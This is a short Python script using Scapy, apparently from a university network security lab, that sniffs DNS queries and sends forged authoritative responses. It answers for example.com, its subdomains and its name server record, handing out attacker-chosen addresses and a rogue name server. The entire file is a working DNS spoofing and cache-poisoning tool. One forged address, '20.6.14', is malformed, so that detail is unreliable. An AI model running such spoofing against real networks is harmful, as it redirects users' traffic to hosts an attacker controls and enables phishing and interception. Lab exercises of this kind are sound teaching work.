#!/usr/bin/env python3
from scapy.all import *

def dns_handler(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        print(f"Query: {qname} from {pkt[IP].src}")
        
        if 'ns.hust-cse.net' in qname:
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='10.10.27.4'))
            send(resp, verbose=0)
        
        elif qname.strip('.') == 'example.com' and pkt[DNSQR].qtype == 1:
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.6.14'))
            send(resp, verbose=0)
        
        elif '.example.com' in qname and pkt[DNSQR].qtype == 1:
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, rdata='20.23.3.19'))
            send(resp, verbose=0)
        
        elif 'example.com' in qname and pkt[DNSQR].qtype == 2:
            resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, ttl=600, type='NS', rdata='ns.hust-cse.net'), ar=DNSRR(rrname='ns.hust-cse.net', ttl=600, rdata='10.10.27.4'))
            send(resp, verbose=0)

print("Starting fake DNS server...")
sniff(filter="udp port 53 and host 10.10.27.4", prn=dns_handler, store=0)

